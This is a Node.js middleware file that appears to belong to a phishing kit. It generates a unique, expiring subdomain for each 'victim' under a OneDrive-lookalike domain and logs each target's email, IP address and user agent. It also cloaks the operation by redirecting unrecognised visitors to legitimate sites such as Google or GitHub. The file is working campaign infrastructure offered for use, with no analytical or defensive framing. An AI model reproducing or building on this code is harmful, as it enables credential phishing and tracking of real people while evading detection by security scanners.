// middleware/subdomainMiddleware.js
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// File paths for persistent storage
const DATA_DIR = './data';
const SUBDOMAIN_STORE_FILE = path.join(DATA_DIR, 'subdomains.json');
const SUBDOMAIN_LOG_FILE = path.join(DATA_DIR, 'subdomains.log');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

// Store active subdomains and their mappings
let subdomainStore = new Map();

// Load subdomains from file on startup
function loadSubdomains() {
    try {
        if (fs.existsSync(SUBDOMAIN_STORE_FILE)) {
            const content = fs.readFileSync(SUBDOMAIN_STORE_FILE, 'utf8');
            const data = JSON.parse(content);
            
            // Convert array back to Map
            if (data.subdomains && Array.isArray(data.subdomains)) {
                data.subdomains.forEach(item => {
                    subdomainStore.set(item.subdomainHash, {
                        email: item.email,
                        campaignId: item.campaignId,
                        createdAt: item.createdAt,
                        expiresAt: item.expiresAt,
                        used: item.used || false,
                        ip: item.ip,
                        userAgent: item.userAgent
                    });
                });
            }
            
            console.log(`📋 Loaded ${subdomainStore.size} subdomains from file`);
            
            // Clean up expired subdomains on load
            cleanupExpiredSubdomains();
        } else {
            fs.writeFileSync(SUBDOMAIN_STORE_FILE, JSON.stringify({ subdomains: [], lastUpdated: new Date().toISOString() }, null, 2));
            console.log('📋 Created new subdomains file');
        }
    } catch(e) {
        console.error('Failed to load subdomains:', e.message);
        subdomainStore = new Map();
    }
}

// Save subdomains to file
function saveSubdomains() {
    try {
        const data = {
            subdomains: Array.from(subdomainStore.entries()).map(([hash, value]) => ({
                subdomainHash: hash,
                email: value.email,
                campaignId: value.campaignId,
                createdAt: value.createdAt,
                expiresAt: value.expiresAt,
                used: value.used,
                ip: value.ip,
                userAgent: value.userAgent
            })),
            totalCount: subdomainStore.size,
            lastUpdated: new Date().toISOString()
        };
        fs.writeFileSync(SUBDOMAIN_STORE_FILE, JSON.stringify(data, null, 2));
        console.log(`💾 Saved ${subdomainStore.size} subdomains to file`);
    } catch(e) {
        console.error('Failed to save subdomains:', e.message);
    }
}

// Log subdomain activity
function logSubdomainActivity(subdomainHash, email, action, details = {}) {
    try {
        const logEntry = {
            timestamp: new Date().toISOString(),
            subdomainHash,
            email,
            action, // 'created', 'accessed', 'expired', 'deleted'
            details,
            ip: details.ip,
            userAgent: details.userAgent
        };
        
        const logLine = JSON.stringify(logEntry) + '\n';
        fs.appendFileSync(SUBDOMAIN_LOG_FILE, logLine);
        
        // Keep only last 1000 log entries (optional cleanup)
        const stats = fs.statSync(SUBDOMAIN_LOG_FILE);
        if (stats.size > 10 * 1024 * 1024) { // 10MB
            // Rotate log file
            const rotatedLogFile = `${SUBDOMAIN_LOG_FILE}.${Date.now()}.old`;
            fs.renameSync(SUBDOMAIN_LOG_FILE, rotatedLogFile);
            console.log(`🔄 Rotated subdomain log file to ${rotatedLogFile}`);
        }
    } catch(e) {
        console.error('Failed to log subdomain activity:', e.message);
    }
}

// Clean up expired subdomains
function cleanupExpiredSubdomains() {
    const now = Date.now();
    let expiredCount = 0;
    
    for (const [hash, data] of subdomainStore.entries()) {
        if (data.expiresAt < now) {
            subdomainStore.delete(hash);
            expiredCount++;
            logSubdomainActivity(hash, data.email, 'expired', { expiredAt: new Date(data.expiresAt).toISOString() });
        }
    }
    
    if (expiredCount > 0) {
        console.log(`🗑️ Cleaned up ${expiredCount} expired subdomains`);
        saveSubdomains();
    }
}

// Generate unique subdomain for each victim
function generateUniqueSubdomain(email, campaignId = 'default', req = null) {
    const timestamp = Date.now();
    const hash = crypto.createHash('sha256')
        .update(`${email}:${campaignId}:${timestamp}:${crypto.randomBytes(8).toString('hex')}`)
        .digest('hex')
        .substring(0, 10);
    
    const baseDomain = process.env.BASE_DOMAIN || 'driveone.online';
    const fullSubdomain = `${hash}.${baseDomain}`;
    
    // Get IP and User-Agent if request is provided
    let ip = null;
    let userAgent = null;
    if (req) {
        ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        userAgent = req.headers['user-agent'] || 'unknown';
    }
    
    // Store mapping
    subdomainStore.set(hash, {
        email: email,
        campaignId: campaignId,
        createdAt: timestamp,
        expiresAt: timestamp + 24 * 60 * 60 * 1000, // 24 hours
        used: false,
        ip: ip,
        userAgent: userAgent
    });
    
    // Log creation
    logSubdomainActivity(hash, email, 'created', { 
        campaignId, 
        expiresAt: new Date(timestamp + 24 * 60 * 60 * 1000).toISOString(),
        ip,
        userAgent
    });
    
    // Save to file
    saveSubdomains();
    
    // Clean up old entries periodically (every 10 creations)
    if (subdomainStore.size % 10 === 0) {
        cleanupExpiredSubdomains();
    }
    
    return {
        subdomain: fullSubdomain,
        subdomainHash: hash,
        expiresAt: new Date(timestamp + 24 * 60 * 60 * 1000).toISOString()
    };
}

// Validate a subdomain
function validateSubdomain(subdomainHash) {
    const stored = subdomainStore.get(subdomainHash);
    
    if (!stored) {
        return { valid: false, reason: 'not_found' };
    }
    
    if (stored.expiresAt < Date.now()) {
        return { valid: false, reason: 'expired' };
    }
    
    // Mark as used (optional - track if subdomain has been accessed)
    if (!stored.used) {
        stored.used = true;
        subdomainStore.set(subdomainHash, stored);
        saveSubdomains();
        logSubdomainActivity(subdomainHash, stored.email, 'accessed', { firstAccess: true });
    }
    
    return {
        valid: true,
        data: stored
    };
}

// Block a subdomain (mark as invalid/revoked)
function blockSubdomain(subdomainHash) {
    if (subdomainStore.has(subdomainHash)) {
        const data = subdomainStore.get(subdomainHash);
        subdomainStore.delete(subdomainHash);
        saveSubdomains();
        logSubdomainActivity(subdomainHash, data.email, 'blocked', {});
        console.log(`🔴 Subdomain blocked: ${subdomainHash}`);
        return true;
    }
    return false;
}

// Get subdomain statistics
function getSubdomainStats() {
    const now = Date.now();
    let active = 0;
    let expired = 0;
    let used = 0;
    
    for (const [hash, data] of subdomainStore.entries()) {
        if (data.expiresAt > now) {
            active++;
            if (data.used) used++;
        } else {
            expired++;
        }
    }
    
    return {
        total: subdomainStore.size,
        active: active,
        expired: expired,
        used: used,
        uniqueEmails: new Set(Array.from(subdomainStore.values()).map(v => v.email)).size,
        uniqueCampaigns: new Set(Array.from(subdomainStore.values()).map(v => v.campaignId)).size
    };
}

// Get all subdomains (for API)
function getAllSubdomains() {
    const now = Date.now();
    return Array.from(subdomainStore.entries()).map(([hash, data]) => ({
        subdomainHash: hash,
        subdomain: `${hash}.${process.env.BASE_DOMAIN || 'driveone.online'}`,
        email: data.email,
        campaignId: data.campaignId,
        createdAt: new Date(data.createdAt).toISOString(),
        expiresAt: new Date(data.expiresAt).toISOString(),
        isExpired: data.expiresAt < now,
        used: data.used || false,
        ip: data.ip,
        userAgent: data.userAgent
    }));
}

// Middleware to extract and validate subdomain
function subdomainMiddleware(req, res, next) {
    const host = req.headers.host;
    
    if (!host) {
        req.subdomain = null;
        req.subdomainValid = false;
        return next();
    }
    
    // Whitelist localhost and development hosts
    const isLocalhost = host === 'localhost' || 
                       host === 'localhost:3001' || 
                       host === 'localhost:3000' ||
                       host.startsWith('127.0.0.1') ||
                       host.startsWith('::1');
    
    if (isLocalhost) {
        console.log(`🔓 Localhost detected: ${host} - bypassing subdomain check`);
        req.subdomain = null;
        req.subdomainValid = true;
        req.isLocalhost = true;
        return next();
    }
    
    // Extract subdomain from host
    const parts = host.split('.');
    let subdomainHash = null;
    
    if (parts.length >= 3) {
        subdomainHash = parts[0];
        
        // Validate the subdomain
        const validation = validateSubdomain(subdomainHash);
        
        if (validation.valid) {
            req.subdomain = subdomainHash;
            req.subdomainValid = true;
            req.subdomainData = validation.data;
            console.log(`✅ Valid subdomain: ${host} -> ${validation.data.email}`);
            
            // Log access
            logSubdomainActivity(subdomainHash, validation.data.email, 'accessed', {
                path: req.path,
                method: req.method,
                ip: req.ip
            });
        } else {
            req.subdomain = subdomainHash;
            req.subdomainValid = false;
            req.subdomainError = validation.reason;
            console.log(`⚠️ Invalid subdomain: ${host} (Reason: ${validation.reason})`);
        }
    } else {
        req.subdomain = null;
        req.subdomainValid = false;
        req.subdomainError = 'no_subdomain';
    }
    
    next();
}

// Middleware to block requests with invalid subdomains
function blockInvalidSubdomains(req, res, next) {
    const host = req.headers.host;
    const baseDomain = process.env.BASE_DOMAIN || 'driveone.online';
    
    // Skip for localhost
    const isLocalhost = host === 'localhost' || 
                       host === 'localhost:3001' || 
                       host === 'localhost:3000' ||
                       host.startsWith('127.0.0.1') ||
                       host.startsWith('::1');
    
    if (isLocalhost) {
        return next();
    }
    
    // Allow main domain and API endpoints
    if (host === baseDomain || host === `www.${baseDomain}` || 
        req.path.startsWith('/api/') || req.path === '/health' || req.path === '/test') {
        return next();
    }
    
    // Check if it's a valid subdomain
    const parts = host.split('.');
    if (parts.length >= 3) {
        const subdomainHash = parts[0];
        if (subdomainStore.has(subdomainHash)) {
            return next();
        }
    }
    
    // Invalid subdomain - redirect to Google
    console.log(`🚫 Blocked invalid subdomain: ${host}`);
    
    // Random redirect to legitimate sites
    const redirectUrls = [
        'https://www.google.com',
        'https://www.youtube.com',
        'https://www.nasa.gov',
        'https://github.com',
        'https://stackoverflow.com'
    ];
    const randomUrl = redirectUrls[Math.floor(Math.random() * redirectUrls.length)];
    
    return res.redirect(randomUrl);
}

// API endpoint handler for creating subdomains (to be used in routes)
async function handleCreateSubdomain(req, res) {
    console.log('📝 [API] Subdomain creation request received');
    
    const clientIp = req.ip || req.connection.remoteAddress;
    const apiKey = req.headers['x-api-key'];
    
    console.log(`   IP: ${clientIp}`);
    console.log(`   API Key provided: ${apiKey ? 'Yes (length: ' + apiKey.length + ')' : 'No'}`);
    
    // Accept from localhost OR any request with valid API key
    const isLocalhost = clientIp === '127.0.0.1' || 
                       clientIp === '::1' || 
                       clientIp === '::ffff:127.0.0.1';
    
    const INTERNAL_API_KEY = process.env.INTERNAL_API_KEY || 'test-api-key-12345';
    
    if (!isLocalhost && (!apiKey || apiKey !== INTERNAL_API_KEY)) {
        console.log(`🚫 Blocked external API access from ${clientIp}`);
        return res.status(403).json({ error: 'Access denied - Invalid API key' });
    }
    
    const { email, campaignId } = req.body;
    
    if (!email) {
        console.log(`❌ No email provided`);
        return res.status(400).json({ error: 'Email required' });
    }
    
    // Generate the subdomain
    const subdomainInfo = generateUniqueSubdomain(email, campaignId || 'email_campaign', req);
    
    console.log(`✅ Created subdomain for ${email}: ${subdomainInfo.subdomain}`);
    console.log(`   Hash: ${subdomainInfo.subdomainHash}`);
    console.log(`   Expires: ${subdomainInfo.expiresAt}`);
    
    res.json({
        success: true,
        subdomain: subdomainInfo.subdomain,
        subdomainHash: subdomainInfo.subdomainHash,
        expiresAt: subdomainInfo.expiresAt
    });
}

// Get subdomain stats handler
function handleSubdomainStats(req, res) {
    const stats = getSubdomainStats();
    const subdomains = getAllSubdomains();
    
    res.json({
        stats: stats,
        subdomains: subdomains,
        baseDomain: process.env.BASE_DOMAIN || 'driveone.online'
    });
}

// Cleanup expired subdomains handler
function handleCleanupExpired(req, res) {
    const before = subdomainStore.size;
    cleanupExpiredSubdomains();
    const after = subdomainStore.size;
    
    res.json({
        success: true,
        before: before,
        after: after,
        removed: before - after,
        message: `Removed ${before - after} expired subdomains`
    });
}

// Block subdomain handler
function handleBlockSubdomain(req, res) {
    const { subdomainHash } = req.body;
    
    if (!subdomainHash) {
        return res.status(400).json({ error: 'subdomainHash required' });
    }
    
    const blocked = blockSubdomain(subdomainHash);
    
    if (blocked) {
        res.json({ success: true, message: `Subdomain ${subdomainHash} blocked` });
    } else {
        res.json({ success: false, message: 'Subdomain not found' });
    }
}

// Initialize on load
loadSubdomains();

// Run cleanup every hour
setInterval(() => {
    cleanupExpiredSubdomains();
}, 60 * 60 * 1000); // Every hour

module.exports = {
    // Main middleware
    subdomainMiddleware,
    blockInvalidSubdomains,
    
    // Core functions
    generateUniqueSubdomain,
    validateSubdomain,
    blockSubdomain,
    cleanupExpiredSubdomains,
    
    // Statistics and data
    getSubdomainStats,
    getAllSubdomains,
    getSubdomainStore: () => subdomainStore,
    
    // API handlers
    handleCreateSubdomain,
    handleSubdomainStats,
    handleCleanupExpired,
    handleBlockSubdomain,
    
    // Logging
    logSubdomainActivity
};